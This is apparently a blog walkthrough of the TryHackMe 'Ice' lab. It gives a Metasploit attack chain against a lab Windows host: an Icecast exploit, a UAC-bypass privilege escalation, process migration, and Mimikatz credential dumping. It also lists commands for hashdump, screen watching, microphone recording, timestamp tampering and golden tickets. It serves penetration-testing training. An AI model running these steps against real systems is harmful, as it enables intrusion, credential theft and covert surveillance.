---
title: "TryHackMe Ice - Walkthrough by Nisha"
toc: true
toc_label: "Table of Contents"
toc_icon: "list-alt"
categories:
  - Blog
  - CTF
tags:
  - Cybersecurity
  - Windows
  - Penetration Testing
  - Ethical Hacking
  - TryHackMe
  - CTF
  - Privilege Escalation
  - Machines
teaser: assets/images/thm/thm-ice-00.png  
tagline: "Deploy & hack into a Windows machine, exploiting a very poorly secured media server."
header:
  overlay_filter: rgba(0, 0, 0, 0.5)
  overlay_image: /assets/images/thm/thm-ice-0.png
  caption: "Photo credit: [**imgur**](https://tryhackme.com/r/room/ice)"
---


<h5>Deploy & hack into a Windows machine, exploiting a very poorly secured media server. </h5>

<img src="/assets/images/thm/thm-ice-1.png">

<strong> Room Link: </strong> <a href="https://tryhackme.com/r/room/ice"> https://tryhackme.com/r/room/ice</a>


{% include toc %}

## Task 1 - Connect 

Get connected to the TryHackMe network using OpenVPN. Make sure to first download your configuration file from <a href="http://tryhackme.com/access ">your access page. </a>



## Task 2 - Recon

Click on Start Machine to deploy the machine!

<img src="/assets/images/thm/thm-ice-2.png">

Time to Scan and Enumerate our target!


An NMAP scan reveals the following ports were discovered to be open:

<img src="/assets/images/thm/thm-ice-3.png">

 Q: One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on? <br>
<em> Answer: 3389</em>



 Q: What service did nmap identify as running on port 8000? (First word of this service) <br>
<em> Answer: Icecast </em>

<img src="/assets/images/thm/thm-ice-4.png">


Q: What does Nmap identify as the hostname of the machine? (All caps for the answer)<br>
<em> Answer: DARK-PC </em>

<img src="/assets/images/thm/thm-ice-20.png">

## Task 3 - Gain Access

In this task we must find a way to exploit any vulnerable services on the target to gain a foothold. The cvedetails website reveals that the impact score and the CVE number for this vulnerability as displayed in the image below. 


<strong> Q: What is the Impact Score for this vulnerability? Use <a href="https://www.cvedetails.com">https://www.cvedetails.com </a> for this question and the next.  </strong><br>
<em> Answer: 6.4 </em>

<img src="/assets/images/thm/thm-ice-6.png">


<strong> Q: What is the CVE number for this vulnerability?  </strong><br>
<em> Answer: CVE-2004-1561 </em>

It is time to use the information that we have collected to locate an exploit for our target.  We will use automation for this exploitation exercise with Metasploit being our tool of choice. 

Type "msfconsole" to launch the Metasploit Framework. <br>


```bash
msfconsole
```

<img src="/assets/images/thm/thm-ice-7.png">

<strong> Q: After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the Metasploit module. </strong><br>
<em> Answer: exploit/windows/http/icecast_header</em>

<img src="/assets/images/thm/thm-ice-8.png">

```bash
use exploit/windows/http/icecast_header  
```

<img src="/assets/images/thm/thm-ice-9.png">

```bash
set RHOSTS 10.2.119.123

```

<img src="/assets/images/thm/thm-ice-10.png">

```bash
set LHOST tun0
```

<img src="/assets/images/thm/thm-ice-11.png">


<strong> # set LHOST <em> attackerIPaddress or interface  

```bash
 exploit 
```

<img src="/assets/images/thm/thm-ice-12.png">



## Task 4 - Escalate

<h5> Our goal for this task is to complete any local enumeration to discover paths to escalte our privileges in our quest to gain Admin powers. </h5>


<strong> Q: Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now? </strong><br>
<em> Answer: meterpreter </em>

<img src="/assets/images/thm/thm-ice-12.png">

<strong> Q: What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'Metasploit' module. </strong><br>
<em> Answer: Dark </em>

<img src="/assets/images/thm/thm-ice-13.png">


<strong> Q: What build of Windows is the system? </strong><br>
<em> Answer: 7601 </em>

```bash
sysinfo
```


<img src="/assets/images/thm/thm-ice-13.png">


<strong> Q:Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running? </strong><br>
<em> Answer: x64 </em>

<img src="/assets/images/thm/thm-ice-22.png">


Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete* <br>

``bash
run post/multi/recon/local_exploit_suggester
```

 Q: Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit? <br>
 Answer: exploit/windows/local/bypassuac_eventvwr 

<img src="/assets/images/thm/thm-ice-14.png">


Q: Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

A: No Answer Needed

<img src="/assets/images/thm/thm-ice-15.png">
 
Q: Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT` <br>
A: No answer needed
 
Q: Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

```bash
set session 1
```
<img src="/assets/images/thm/thm-ice-16.png">

A: No answer needed
 
Q: Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

A: LHOST


 
Q: Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

A: No answer needed

<img src="/assets/images/thm/thm-ice-17.png">


Q: After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails. 

A: No answer needed

<img src="/assets/images/thm/thm-ice-17.png">


Q: Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

A: No answer needed
 
Q: We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

A: SeTakeOwnershipPrivilege

```bash
getprivs
```

<img src="/assets/images/thm/thm-ice-18.png">


## Task 5 - Looting


<img src="/assets/images/thm/thm-ice-19.png">

Q: Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't). 

A: No answer needed
 
 <img src="/assets/images/thm/thm-ice-23.png">


Q: In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?<br>


Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. <br>

A: spoolsv.exe

 <img src="/assets/images/thm/thm-ice-23.png">
 

Q: Migrate to this process now with the command `migrate -N PROCESS_NAME`

A: No answer needed

```bash
migrate -N spoolsv.exe
```
 <img src="/assets/images/thm/thm-ice-24.png">

 
Q: Let's check what user we are now with the command `getuid`. What user is listed?

```bash
getuid
```

A: NT AUTHORITY\SYSTEM

 <img src="/assets/images/thm/thm-ice-25.png



Q: Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

A: No answer needed

```bash
load kiwi
```

 <img src="/assets/images/thm/thm-ice-26.png
 

Q: Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`. 

A: No answer needed
 
Q: Which command allows up to retrieve all credentials?

A: creds_all

 <img src="/assets/images/thm/thm-ice-27.png
 
Q: Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

A: Password01

 <img src="/assets/images/thm/thm-ice-28.png


## Task 6 - Post-Exploitation

Q: Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.<br>
A: No answer needed


 
Q: What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)

A: hashdump
 
Q: While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

A: screenshare
 
Q: How about if we wanted to record from a microphone attached to the system?
A: record_mic
 
Q: To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

timestomp
 
Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

golden_ticket_create
 
One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`




## Task 7 - Extra Credit

